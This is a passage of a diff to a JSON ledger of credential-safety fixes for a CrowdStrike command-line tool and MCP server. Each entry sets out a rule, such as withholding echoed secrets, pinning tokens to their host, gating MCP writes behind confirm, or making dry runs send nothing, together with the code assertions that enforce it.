(internal/cli/secret_funnel_cli.go), and every MCP error result and handler error through the outermost tool middleware (cmd/<mcp>/secret_funnel_mcp.go). Success output is never funnelled.",
-   "why": "class_harness.py secret-echo (Step 3.1, PR #436) drives the built CLI and MCP server against a fake server that reflects each configured credential in every encoding; on origin/main this connector printed the credential HTML-entity-encoded, JSON-escaped, double URL-encoded or base64 (the generated masks cover only the raw, QueryEscape and PathEscape forms; press issue #5145). Matching encoded needles one at a time never converged (saas-alerts and cisco-meraki review loops), so the fix is a decode-then-check backstop that withholds the whole text and fails closed (text over 4 MiB, a decoding chain that does not settle in 32 rounds, or work past the budget is withheld). Classification is kept: the plain withheld notice avoids every word the auth-error classifiers match, and a withheld text that itself read as an auth failure gets a notice that says so (an HTTP 400 'invalid token' answer echoing the token keeps its auth exit code). Codex round 1 (2026-10-23) added that, the fail-closed depth bound (a text-like layer left at depth 8 withholds), the JavaScript escapes \\v, \\0 and the identity escape, a bounded \\u{ search, and the token-endpoint error bodies outside the client. Known limits: values under 8 characters are only masked as written; case-changed, split-and-interleaved or otherwise transformed (compressed, encrypted) echoes are not reconstructed. A reprint that drops these edits fails class_harness.py secret-echo in CI and these asserts.",
    "status": "active",
-   "spec_encode_followup": "Press-side: cli-printing-press issue #5145 (encoded credential echo). The generated maskCredentialText should end in a decode-then-check backstop over every held credential, and the error-body and token-endpoint paths should check the whole body before the display cut.",
+   "summary": "The on-disk response cache is off on every client: raw CrowdStrike bodies never sit in cache files.",
+   "why": "Work order: nothing but the credential store holds a credential. c.NoCache = true in guardClient (crowdstrike_guard.go); TestGuardWrapsTheSessionTransport asserts it. README and SKILL say responses are never cached (tools/apply_docfixes.py). Ported to crowdstrike from the vsphere 4.34.2 reprint (one credential layer across the fleet). Ported to crowdstrike from the microsoft-graph 4.34.2 reprint (one credential layer across the fleet). Ported to crowdstrike from the pax8 4.34.2 reprint (one credential layer across the fleet). Ported to crowdstrike from the gradient 4.34.2 reprint (one credential layer across the fleet). Ported to crowdstrike from the action1 4.34.2 reprint (one credential layer across the fleet). Ported to crowdstrike from the appdirect 4.34.2 reprint (one credential layer across the fleet).",
    "asserts": [
     {
-     "file": "cli/internal/cliutil/secret_funnel.go",
-     "contains": "func FunnelEchoes(text string, secrets []string) bool {",
+     "file": "cli/internal/cli/crowdstrike_guard.go",
+     "contains": "c.NoCache = true",
+     "code_only": true
+    }
+   ]
+  },
+  {
+   "id": "store-never-keeps-secrets",
+   "class": "secret-echo",
+   "status": "active",
+   "summary": "Every resource write passes mergeIncomingResourceData, which redacts credential-named values (withoutStoredSecrets); every SQL handle, the read-write store's included, goes through the credential kit's SQL sink (credsql.Driver, handfixes.json credkit-sqlite-every-handle), which withholds a statement or a row that carries a held value.",
+   "why": "Work order: no credential in files. A credential-named value is never a record the store needs, so it is redacted whatever is held; a held value under any other name is the kit's to withhold (it replaced the hand withholding driver and the storedID rewrite). Covered by TestNoCredentialInAnyWrittenFile (.db files scanned) and TestStoreRedactsCredentialNamedValuesNotHeld.",
+   "asserts": [
+    {
+     "file": "cli/internal/store/store.go",
+     "contains": "return withoutStoredSecrets(s.mergeIncomingResourceDataRaw(tx, resourceType, id, incoming))",
      "min_count": 1,
      "code_only": true
     },
     {
-     "file": "cli/internal/cliutil/secret_funnel_test.go",
-     "contains": "func TestFunnelRecognizesEveryEncodingOfAHeldSecret(t *testing.T) {",
+     "file": "cli/internal/store/store.go",
+     "contains": "db, err := sql.Open(credsql.Driver, dsn)",
+     "min_count": 3,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/store/store.go",
+     "not_contains": "WithholdingSQLiteDriver"
+    }
+   ]
+  },
+  {
+   "id": "mcp-mirror-write-confirm",
+   "class": "write-safety",
+   "status": "active",
+   "summary": "No MCP tool changes CrowdStrike state: every endpoint tool is a GET marked read-only and every mirrored command is read-only or writes only the CLI's own files. The confirm gate stays installed so a mirrored command a later print adds that is neither read-only nor local previews and sends only with confirm: true.",
+   "why": "Work order: an MCP write previews and sends only with confirm: true. RequireConfirmForMirroredWrites (hand file internal/mcp/cobratree/crowdstrike_confirm.go), called from RegisterTools after RegisterAll. TestRegisteredMirroredWritesNeedConfirm fails on any registered tool that is not read-only, not on its local list and has no confirm gate; TestMCPSendsOnlyReads (black-box) checks a full MCP battery sends only GETs and the two logins. Ported to crowdstrike from the vsphere 4.34.2 reprint (one credential layer across the fleet). Ported to crowdstrike from the microsoft-graph 4.34.2 reprint (one credential layer across the fleet). Ported to crowdstrike from the pax8 4.34.2 reprint (one credential layer across the fleet). Ported to crowdstrike from the gradient 4.34.2 reprint (one credential layer across the fleet). Ported to crowdstrike from the action1 4.34.2 reprint (one credential layer across the fleet). Ported to crowdstrike from the appdirect 4.34.2 reprint (one credential layer across the fleet).",
+   "asserts": [
+    {
+     "file": "cli/internal/mcp/tools.go",
+     "contains": "cobratree.RequireConfirmForMirroredWrites(s, cli.RootCmd(), cobratree.CachedSiblingCLIPath)",
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/mcp/cobratree/crowdstrike_confirm.go",
+     "contains": "func RequireConfirmForMirroredWrites(",
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/mcp/crowdstrike_confirm_registered_test.go",
+     "contains": "func TestRegisteredMirroredWritesNeedConfirm(t *testing.T) {",
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/crowdstrikeblackbox/blackbox_test.go",
+     "contains": "func TestMCPSendsOnlyReadsWithoutConfirm(t *testing.T) {",
+     "code_only": true
+    }
+   ]
+  },
+  {
+   "id": "docs-credential-safety",
+   "class": "docs",
+   "status": "active",
+   "summary": "README and SKILL carry a Credential safety section (which host gets which credential, the credential kit's withheld notice, 0600 store, dry run, MCP confirm) and no longer promise a five-minute response cache (the cache is off on every client).",
+   "why": "The generated docs describe the press defaults (a response cache) that the credential layer turns off; a reprint restores the false promise and drops the transcripts reasoning the work order requires. Ported to crowdstrike from the microsoft-graph 4.34.2 reprint (one credential layer across the fleet). Ported to crowdstrike from the pax8 4.34.2 reprint (one credential layer across the fleet). Ported to crowdstrike from the gradient 4.34.2 reprint (one credential layer across the fleet). Ported to crowdstrike from the action1 4.34.2 reprint (one credential layer across the fleet). Ported to crowdstrike from the appdirect 4.34.2 reprint (one credential layer across the fleet).",
+   "asserts": [
+    {
+     "file": "guide.md",
+     "contains": "## Credential safety"
+    },
+    {
+     "file": "SKILL.md",
+     "contains": "## Credential safety"
+    },
+    {
+     "file": "guide.md",
+     "not_contains": "cached for five minutes"
+    },
+    {
+     "file": "SKILL.md",
+     "not_contains": "cached for five minutes"
+    },
+    {
+     "file": "guide.md",
+     "contains": "[credkit: withheld from stdout: it carried a credential this program holds]"
+    },
+    {
+     "file": "SKILL.md",
+     "contains": "[credkit: withheld from stdout: it carried a credential this program holds]"
+    },
+    {
+     "file": "guide.md",
+     "not_contains": "[text withheld: it repeated a secret value this program holds]"
+    },
+    {
+     "file": "SKILL.md",
+     "not_contains": "[text withheld: it repeated a secret value this program holds]"
+    }
+   ]
+  },
+  {
+   "id": "dry-run-sends-nothing",
+   "class": "dry-run",
+   "status": "active",
+   "summary": "A client built under --dry-run refuses every request at its transport, so no write, mint or refresh can reach CrowdStrike whatever a command does with the client; `auth login --dry-run` sends nothing too.",
+   "why": "Defense in depth beside dry-run-never-mints: the generated preview path returns before sending, and this transport makes a missed branch fail closed. The black-box test runs writes and auth login under --dry-run from a cold start against a fake token host and API host and counts zero requests on both. Ported to crowdstrike from the pax8 4.34.2 reprint (one credential layer across the fleet). Ported to crowdstrike from the gradient 4.34.2 reprint (one credential layer across the fleet). Ported to crowdstrike from the action1 4.34.2 reprint (one credential layer across the fleet). Ported to crowdstrike from the appdirect 4.34.2 reprint (one credential layer across the fleet).",
+   "asserts": [
+    {
+     "file": "cli/internal/cli/crowdstrike_guard.go",
+     "contains": "inner = dryRunTripper{}",
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/crowdstrikeblackbox/blackbox_test.go",
+     "contains": "func TestDryRunSendsNothing(t *testing.T) {",
+     "code_only": true
+    }
+   ]
+  },
+  {
+   "id": "mcp-endpoint-write-confirm",
+   "class": "write-safety",
+   "status": "active",
+   "summary": "Every typed MCP endpoint tool that is not read-only (create or update a company or contact, delete a contact, create an order, update or cancel a subscription) returns a preview of the request and sends nothing until confirm is boolean true; the gate wraps every non-read-only, non-mirrored tool, so one a later print adds is gated too.",
+   "why": "Work order connector note: every MCP write must preview and send only with confirm: true. Press 4.34.2's in-process endpoint handlers (makeAPIHandler) send writes directly. The gate (hand file internal/mcp/crowdstrike_endpoint_confirm.go) is installed by one anchored line in the generated tools.go after every registration and before the read-only drop. The black-box test drives the real MCP server against a fake CrowdStrike: no write without confirm, the string \"true\" previews, and boolean true sends (control). Ported to crowdstrike from the pax8 4.34.2 reprint (one credential layer across the fleet). Ported to crowdstrike from the gradient 4.34.2 reprint (one credential layer across the fleet). Ported to crowdstrike from the action1 4.34.2 reprint (one credential layer across the fleet). Ported to crowdstrike from the appdirect 4.34.2 reprint (one credential layer across the fleet).",
+   "asserts": [
+    {
+     "file": "cli/internal/mcp/tools.go",
+     "contains": "RequireConfirmForEndpointWrites(s)",
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/mcp/crowdstrike_endpoint_confirm.go",
+     "contains": "func RequireConfirmForEndpointWrites(s *server.MCPServer) {",
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/mcp/crowdstrike_confirm_registered_test.go",
+     "contains": "func TestRegisteredMirroredWritesNeedConfirm(t *testing.T) {",
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/crowdstrikeblackbox/blackbox_test.go",
+     "contains": "func TestMCPSendsOnlyReadsWithoutConfirm(t *testing.T) {",
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/crowdstrikeblackbox/blackbox_test.go",
+     "contains": "func TestMCPWriteSendsOnlyWithConfirmTrue(t *testing.T) {",
+     "code_only": true
+    }
+   ]
+  },
+  {
+   "id": "config-file-holds-no-credential",
+   "class": "secret-persisted",
+   "status": "active",
+   "summary": "config.toml never holds a credential: every value it keeps passes persistedWithoutCredentials (base_url and token_url lose their userinfo, every credential-named query value and every query value or fragment that repeats a configured or environment credential, through cliutil.URLWithoutCredentials; a credential-named header, a credential-shaped one, or one repeating such a credential is left out) and the write is refused when the file still carries one; the legacy scrub writes through the same filter. The 0600 credential store is unchanged. config.toml is written with cliutil.AtomicWriteCredentialFile, a declared exemption of the credential kit, so this filter is its guard.",
+   "why": "Codex r1 class credential-persisted-outside-the-store: `CROWDSTRIKE_BASE_URL='https://api.crowdstrike.com?api_key=X' auth set-token` wrote X (and a userinfo password, a held secret under any query name, a token_url query secret) into config.toml, because the generated save persists base_url and token_url as configured. Work order credential rule: nothing but the 0600 credential store holds a credential. Hand files internal/config/crowdstrike_persist.go and cliutil/crowdstrike_fieldnames.go; three anchored lines in the generated config.go. TestConfigFileNeverHoldsACredential failed on the generated save.",
+   "asserts": [
+    {
+     "file": "cli/internal/config/config.go",
+     "contains": "persist = persistedWithoutCredentials(persisted.persisted(), c)",
      "min_count": 1,
      "code_only": true
     },
     {
-     "file": "cli/internal/client/client.go",
-     "contains": "held = append(held, value)",
+     "file": "cli/internal/config/config.go",
+     "contains": "if err := refuseCredentialInConfigFile(persist, data, c); err != nil {",
      "min_count": 1,
      "code_only": true
     },
     {
-     "file": "cli/internal/client/client.go",
-     "contains": "return cliutil.FunnelWithhold(masked, held)",
+     "file": "cli/internal/config/config.go",
+     "contains": "scrubbed := persistedWithoutCredentials(legacy.persisted(), c)",
      "min_count": 1,
      "code_only": true
     },
     {
-     "file": "cli/internal/client/client.go",
-     "contains": "func (c *Client) shownErrorBody(body []byte, extraCredentials ...string) string {",
+     "file": "cli/internal/config/crowdstrike_persist.go",
+     "contains": "func persistedWithoutCredentials(p persistedConfig, c *Config) persistedConfig {",
      "min_count": 1,
      "code_only": true
     },
     {
-     "file": "cli/internal/client/client.go",
-     "contains": "Body:       c.shownErrorBody(respBody, authHeader),",
+     "file": "cli/internal/config/crowdstrike_persist.go",
+     "contains": "func refuseCredentialInConfigFile(persist any, data []byte, c *Config) error {",
      "min_count": 1,
      "code_only": true
     },
     {
-     "file": "cli/internal/client/client.go",
-     "not_contains": "c.maskCredentialText(truncateBody(respBody), authHeader)"
+     "file": "cli/internal/config/crowdstrike_persist.go",
+     "contains": "creds := configCredentialValues(c)",
+     "min_count": 2,
+     "code_only": true
     },
     {
-     "file": "cli/internal/client/client.go",
-     "contains": "cliutil.SanitizeErrorBody(c.shownErrorBody(body, clientID, clientSecret))",
+     "file": "cli/internal/cliutil/crowdstrike_fieldnames.go",
+     "contains": "func URLWithoutCredentials(raw string, held ...string) (clean string, changed bool) {",
      "min_count": 1,
      "code_only": true
     },
     {
-     "file": "cli/internal/client/client.go",
-     "contains": "cliutil.SanitizeErrorBody(c.shownErrorBody(body)))",
+     "file": "cli/internal/config/crowdstrike_persist_test.go",
+     "contains": "func TestSavedConfigFileKeepsNoCredential(t *testing.T) {",
      "min_count": 1,
      "code_only": true
     },
     {
-     "file": "cli/internal/client/client.go",
-     "not_contains": "cliutil.SanitizeErrorBody(string(body))"
+     "file": "cli/internal/crowdstrikeblackbox/config_file_test.go",
+     "contains": "func TestConfigFileNeverHoldsACredential(t *testing.T) {",
+     "min_count": 1,
+     "code_only": true
+    }
+   ]
+  },
+  {
+   "id": "export-file-closed-on-error",
+   "class": "write-safety",
+   "status": "active",
+   "summary": "export --output closes its (withholding) output file on every return, including an API error: the open no longer shadows RunE's named err",
+   "why": "The generated `f, err := openExportOutput(...)` inside the --output block declared a new err, so the deferred close tested that inner (nil) err and never ran when the export returned an API error. The output file is a credential kit writer, and an unclosed one kept the process from exiting: `export clients --output f.jsonl` after a 401 hung (TestExportOutputReturnsAfterAnAPIError, seen failing 3 of 4 runs).",
+   "asserts": [
+    {
+     "file": "cli/internal/cli/export.go",
+     "contains": "f, ferr := openExportOutput(outputFile)",
+     "min_count": 1,
+     "code_only": true
     },
     {
-     "file": "cli/internal/client/client.go",
-     "not_contains": "cliutil.SanitizeErrorBody(truncateBody(body))"
+     "file": "cli/internal/cli/export.go",
+     "contains": "func openExportOutput(path string) (*credkit.Writer, error) {",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/crowdstrikeblackbox/export_test.go",
+     "contains": "func TestExportOutputReturnsAfterAnAPIError(t *testing.T) {",
+     "min_count": 1,
+     "code_only": true
+    }
+   ]
+  },
+  {
+   "id": "dry-run-changes-nothing",
+   "class": "dry-run",
+   "status": "active",
+   "summary": "--dry-run changes no local file: auth set-token saves nothing, auth logout clears nothing, export --output leaves the file alone (the preview goes to stdout)",
+   "why": "Press-traps s6, measured on this tree: `auth set-token --dry-run` saved the token to credentials.toml, `auth logout --dry-run` cleared the stored credentials, and `export organizations --output f --dry-run` replaced f with the preview. The auth blocks are the fleet replay's auth-dry-run recipe text (this connector's ledger never carried that entry). TestDryRunChangesNoLocalFile seen failing (seen/dry-run-changes-nothing-seen-failing.log). Ported to crowdstrike from the action1 4.34.2 reprint (one credential layer across the fleet). Ported to crowdstrike from the appdirect 4.34.2 reprint (one credential layer across the fleet).",
+   "asserts": [
+    {
+     "file": "cli/internal/cli/auth.go",
+     "contains": "(dry run - nothing saved)",
+     "code_only": true
     },
     {
      "file": "cli/internal/cli/auth.go",
-     "contains": "cliutil.SanitizeErrorBody(cliutil.FunnelWithhold(string(body), []string{clientSecret}))",
-     "min_count": 1,
+     "contains": "(dry run - nothing changed)",
      "code_only": true
     },
     {
-     "file": "cli/internal/cli/auth.go",
-     "not_contains": "cliutil.SanitizeErrorBody(string(body))"
-    },
-    {
-     "file": "cli/internal/cli/fleet_sync.go",
-     "contains": "cliutil.SanitizeErrorBody(cliutil.FunnelWithhold(string(body), []string{clientSecret}))",
-     "min_count": 1,
+     "file": "cli/internal/cli/export.go",
+     "contains": "if flags.dryRun {",
      "code_only": true
     },
     {
-     "file": "cli/internal/cli/fleet_sync.go",
-     "not_contains": "cliutil.SanitizeErrorBody(string(body))"
-    },
+     "file": "cli/internal/cli/crowdstrike_dryrun_writes_test.go",
+     "contains": "func TestDryRunChangesNoLocalFile(t *testing.T) {",
+     "code_only": true
+    }
+   ]
+  },
+  {
+   "id": "api-origin-pinned",
+   "class": "auth-wire",
+   "status": "active",
+   "summary": "A credential goes only to the scheme, host and port configured for it: every API request and the bearer token to the API base URL's origin; the token URL's origin (when it differs) only receives POST <token path> carrying no bearer token; every redirect hop stays on the origin of the request it follows; a non-ASCII or unparseable host never matches; `auth login`'s own token client is pinned the same way",
+   "why": "Work-order credential rule (host pinning). Each CrowdStrike marketplace is its own host, and the token URL is configurable separately (CROWDSTRIKE_TOKEN_URL), so the guard has two pins (the pax8 shape) over action1's one-origin guard. Applied through registerClientHook (every CLI, novel and MCP client) and one anchored line in root.go oauthHTTPClient (tools/apply_credential_rules.py). Ported to crowdstrike from the appdirect 4.34.2 reprint (one credential layer across the fleet).",
+   "asserts": [
     {
-     "file": "cli/internal/cliutil/secret_funnel.go",
-     "contains": "var funnelSteps = []func(string) []string{",
-     "min_count": 1,
+     "file": "cli/internal/cli/crowdstrike_guard.go",
+     "contains": "func (p crowdstrikePins) check(req *http.Request) error {",
      "code_only": true
     },
     {
-     "file": "cli/internal/cliutil/secret_funnel.go",
-     "contains": "funnelTextStep(funnelIdentityUnescape),",
-     "min_count": 1,
+     "file": "cli/internal/cli/crowdstrike_guard.go",
+     "contains": "strings.HasPrefix(auth, \"Basic \")",
      "code_only": true
     },
     {
-     "file": "cli/internal/cliutil/secret_funnel.go",
-     "contains": "func FunnelHeld(text string) string {",
-     "min_count": 1,
+     "file": "cli/internal/cli/crowdstrike_guard.go",
+     "contains": "installPins(c.HTTPClient, newCrowdStrikePins(c.BaseURL, client.ResolveCrowdStrikeTokenURL(c.Config)), c.DryRun)",
      "code_only": true
     },
     {
-     "file": "cli/internal/cliutil/secret_funnel_test.go",
-     "contains": "func TestFunnelCodexRound2(t *testing.T) {",
-     "min_count": 1,
+     "file": "cli/internal/cli/crowdstrike_guard.go",
+     "contains": "func guardTokenClient(hc *http.Client, cfg *config.Config, dryRun bool) {",
      "code_only": true
     },
     {
-     "file": "cli/internal/cli/secret_funnel_cli.go",
-     "contains": "func funnelCommandErrors(root *cobra.Command) {",
-     "min_count": 1,
-     "code_only": true
-    },
-    {
-     "file": "cli/internal/cli/secret_funnel_cli_test.go",
-     "contains": "func TestFunnelCommandErrorsWithholdsAnEchoedCredential(t *testing.T) {",
-     "min_count": 1,
+     "file": "cli/internal/cli/crowdstrike_guard.go",
+     "contains": "registerClientHook(func(c *client.Client) error {",
      "code_only": true
     },
     {
      "file": "cli/internal/cli/root.go",
-     "contains": "funnelCommandErrors(rootCmd)",
-     "min_count": 1,
+     "contains": "guardTokenClient(hc, cfg, f.dryRun)",
      "code_only": true
-    },
+    }
+   ]
+  },
+  {
+   "id": "minted-token-bound-to-its-client",
+   "class": "auth-wire",
+   "status": "active",
+   "summary": "An access token is sent only for the client pair and token URL it was minted with: a stored token only when the files recorded the client ID in effect with it and its token URL resolves the same; an environment pair the files do not hold mints its own token, keeps it in process memory (one mint per process per pair) and never saves it; and every save of a minted token (auth login, the automatic mint, the refresh grant) passes one rule in SaveTokens: the client ID the credential store records beside the token is the one that minted it, or none, else the save is refused (ErrTokenForAnotherClient)",
+   "why": "The generated mint saved every minted token beside the STORED pair (configForSave keeps the environment pair itself off disk), so an operator who switched FALCON_CLIENT_ID / CROWDSTRIKE_BASE_URL to a second marketplace saved marketplace B's token beside A's pair, and the next run sent B's token for A (and A's token for B while it was unexpired). The action1 r1 class (cached authentication ignores credential override) on the generated mint. Hand files internal/client/crowdstrike_tokens.go and internal/config/crowdstrike_tokens.go; two anchored lines in client.go (tools/apply_edits.py). Ported to crowdstrike from the appdirect 4.34.2 reprint (one credential layer across the fleet). Codex r1 of the 0.1.11 branch (session 01a1a833-7a33-7c62-b373-fa46002f296b), class token persistence loses client identity: the binding covered only the automatic mint, so `auth login` with FALCON_CLIENT_ID / FALCON_CLIENT_SECRET set over a stored pair saved that client's token beside the stored client (configForSave keeps the stored pair), and the next run with no environment pair read the other tenant with it. The rule now sits in SaveTokens (hand method tokenSavedBesideItsClient in internal/config/crowdstrike_tokens.go, one anchored line in generated config.go). Seen failing: .review/seen/r1-login-token-client-identity.log (built binary), r1-login-token-client-identity-unit.log.",
+   "asserts": [
     {
-     "file": "cli/cmd/crowdstrike-mcp/main.go",
-     "contains": "server.WithToolHandlerMiddleware(funnelToolErrors),",
-     "min_count": 1,
-     "code_only": true
-    },
-    {
-     "file": "cli/cmd/crowdstrike-mcp/secret_funnel_mcp.go",
-     "contains": "func funnelToolErrors(next server.ToolHandlerFunc) server.ToolHandlerFunc {",
-     "min_count": 1,
-     "code_only": true
-    },
-    {
-     "file": "cli/cmd/crowdstrike-mcp/secret_funnel_mcp_test.go",
-     "contains": "func TestFunnelToolErrorsWithholdsAnEchoedCredential(t *testing.T) {",
-     "min_count": 1,
+     "file": "cli/internal/client/client.go",
+     "contains": "if mint, decided := c.tokenBinding(); decided {",
      "code_only": true
     },
     {
      "file": "cli/internal/client/client.go",
-     "contains": "c.holdCredentials()",
-     "min_count": 1,
+     "contains": "if err := c.keepMintedToken(clientID, clientSecret, tokenResp.AccessToken, expiry); err != nil {",
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/client/crowdstrike_tokens.go",
+     "contains": "func (c *Client) tokenBinding() (mint bool, decided bool) {",
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/client/crowdstrike_tokens.go",
+     "contains": "if c.Config.PairIsStored() && clientID == c.Config.ClientID && clientSecret == c.Config.ClientSecret {",
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/config/crowdstrike_tokens.go",
+     "contains": "func (c *Config) PairIsStored() bool {",
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/config/config.go",
+     "contains": "if err := c.tokenSavedBesideItsClient(clientID, accessToken); err != nil {",
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/config/crowdstrike_tokens.go",
+     "contains": "func (c *Config) tokenSavedBesideItsClient(clientID, accessToken string) error {",
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/config/crowdstrike_r1fix_test.go",
+     "contains": "func TestR1FixTokenSavedOnlyBesideItsClient(t *testing.T) {",
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/crowdstrikeblackbox/crowdstrike_r1fix_test.go",
+     "contains": "func TestR1FixLoginTokenStaysWithItsClient(t *testing.T) {",
+     "code_only": true
+    }
+   ]
+  },
+  {
+   "id": "rejected-mint-returns",
+   "class": "auth-wire",
+   "status": "active",
+   "summary": "A rejected client-credentials mint returns its error (the client ID and secret withheld) instead of hanging: the rendered mint runs as mintClientCredentialsRaw behind a hand wrapper, and the token endpoint's error bodies are masked through shownTokenErrorBody, which does not take the token-state lock again",
+   "why": "fleet/bin/mint_lock_scan.py rc 1 on the 4.34.2 render: the mint and the refresh grant run with the token-state lock held, and their error path masked the body through maskCredentialText, which takes that lock (jamf-pro and threecx hung forever the same way). The ninjaone shape (skills/ninjaone/cli/internal/client/ninja_token_errors.go). TestRejectedMintReturnsWithoutTheSecret is the proof (seen/rejected-mint-hang-seen-failing.log). Ported to crowdstrike from the appdirect 4.34.2 reprint (one credential layer across the fleet).",
+   "asserts": [
+    {
+     "file": "cli/internal/client/client.go",
+     "contains": "func (c *Client) mintClientCredentialsRaw(ctx context.Context, clientID, clientSecret string) error {",
      "code_only": true
     },
     {
      "file": "cli/internal/client/client.go",
-     "contains": "cliutil.FunnelHold(authHeader)",
+     "contains": "cliutil.SanitizeErrorBody(c.shownTokenErrorBody(body, clientID, clientSecret))",
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/client/client.go",
+     "contains": "cliutil.SanitizeErrorBody(c.shownTokenErrorBody(body)))",
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/client/crowdstrike_token_errors.go",
+     "contains": "func (c *Client) shownTokenErrorBody(body []byte, extraCredentials ...string) string {",
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/client/crowdstrike_token_errors_test.go",
+     "contains": "func TestRejectedMintReturnsWithoutTheSecret(t *testing.T) {",
+     "code_only": true
+    }
+   ]
+  },
+  {
+   "id": "token-url-only-from-trusted-config",
+   "class": "auth-wire",
+   "status": "active",
+   "summary": "The token URL the client ID and secret are posted to comes only from trusted configuration: CROWDSTRIKE_TOKEN_URL or the base URL's own origin, http or https, a non-empty ASCII host and no userinfo; anything else (and a route Load refused because a config file other users can change names the host) resolves to no token URL, and the mint, the refresh grant and auth login refuse with ErrNoCrowdStrikeTokenURL instead of posting anywhere. A stored token is bound to a non-empty token URL.",
+   "why": "Codex review round 1 of the 4.34.2 reprint (review repo ce4623f), class credential-sent-to-another-host: CROWDSTRIKE_BASE_URL=https://user@tenant.example.net/api with the client pair made auth login POST the pair to api.crowdstrike.com (the resolver fell back to CrowdStrike's own marketplace for any base URL it could not derive), and a loose config.toml's base_url chose the token host auth login posted to. Seen failing: seen/r1-credential-sent-to-another-host-seen-failing.log. Ported to crowdstrike from the appdirect 4.34.2 reprint (one credential layer across the fleet).",
+   "asserts": [
+    {
+     "file": "cli/internal/client/crowdstrike_token_url.go",
+     "contains": "func tokenSafeURL(raw string) (*url.URL, bool) {",
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/client/crowdstrike_token_url.go",
+     "contains": "if cfg.CredentialRouteBlocked() {",
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/client/crowdstrike_token_url.go",
+     "contains": "var ErrNoCrowdStrikeTokenURL = errors.New(",
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/client/crowdstrike_token_errors.go",
+     "contains": "if ResolveCrowdStrikeTokenURL(c.Config) == \"\" {",
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/client/client.go",
+     "contains": "return ErrNoCrowdStrikeTokenURL",
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/auth.go",
+     "contains": "return configErr(client.ErrNoCrowdStrikeTokenURL)",
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/client/crowdstrike_tokens.go",
+     "contains": "return id != \"\" && tokenURL != \"\" && id == strings.TrimSpace(s.ClientID)",
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/client/crowdstrike_codex_r1_test.go",
+     "contains": "func TestR1TokenURLNeverLeavesTheConfiguredHost(t *testing.T) {",
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/client/crowdstrike_codex_r1_test.go",
+     "contains": "func TestR1UntrustedConfigNeverChoosesTheTokenHost(t *testing.T) {",
+     "code_only": true
+    }
+   ]
+  },
+  {
+   "id": "config-check-reads-back-every-shape",
+   "class": "secret-persisted",
+   "status": "active",
+   "summary": "The last check before config.toml is written reads back the exact bytes whatever shape produced them (an agentcookie-managed save marshals the whole configuration) and refuses a file that carries a credential key or repeats the configuration's or the environment's credentials as written; every header is judged by name, by credential shape and by those values (headerHoldsCredential). Under agentcookie a minted token stays in process memory.",
+   "why": "Codex review round 1 of the 4.34.2 reprint, class credential-persisted-outside-the-store: with .agentcookie-managed beside config.toml, `printf 'NewBearer-739182' | auth set-token` wrote the bearer into config.toml (the check returned early for any shape but the credential-free one). The generated TestAgentcookieMarkerKeepsCredentialsInConfig asserted the old behavior and now asserts the refusal. A header holding an encoding of a credential is no longer matched here: config.toml is a declared exemption of the credential kit, whose matcher this check used to copy (contract section 1: a header value is free text).",
+   "asserts": [
+    {
+     "file": "cli/internal/config/crowdstrike_persist.go",
+     "contains": "func refuseCredentialInConfigFile(persist any, data []byte, c *Config) error {",
      "min_count": 1,
      "code_only": true
     },
     {
-     "file": "cli/internal/cli/helpers.go",
-     "contains": "funnelShownError(err),",
+     "file": "cli/internal/config/crowdstrike_persist.go",
+     "contains": "func headerHoldsCredential(name, value string, creds []string) bool {",
      "min_count": 1,
      "code_only": true
     },
     {
-     "file": "cli/internal/cli/helpers.go",
-     "not_contains": "\"error\": err.Error(),"
+     "file": "cli/internal/config/crowdstrike_persist.go",
+     "contains": "if err := toml.Unmarshal(data, &doc); err != nil {",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cliutil/credentials_test.go",
+     "contains": "func TestAgentcookieMarkerNeverKeepsCredentialsInConfig(t *testing.T) {",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cliutil/credentials_test.go",
+     "not_contains": "func TestAgentcookieMarkerKeepsCredentialsInConfig("
+    },
+    {
+     "file": "cli/internal/client/crowdstrike_tokens.go",
+     "contains": "if c.Config.AgentcookieManagedByExternalStore() {",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/config/crowdstrike_codex_r1_test.go",
+     "contains": "func TestR1AgentcookieSaveNeverWritesACredential(t *testing.T) {",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/config/config.go",
+     "contains": "if refuseCredentialInConfigFile(scrubbed, scrubbedData, c) != nil {",
+     "min_count": 1,
+     "code_only": true
+    }
+   ]
+  },
+  {
+   "id": "doctor-probe-counts-the-client-pair",
+   "class": "doctor-truth",
+   "status": "active",
+   "summary": "doctor's credential probe counts the client pair as a configured credential (as its auth line does), so a pair-only install is probed instead of reported as having no credential.",
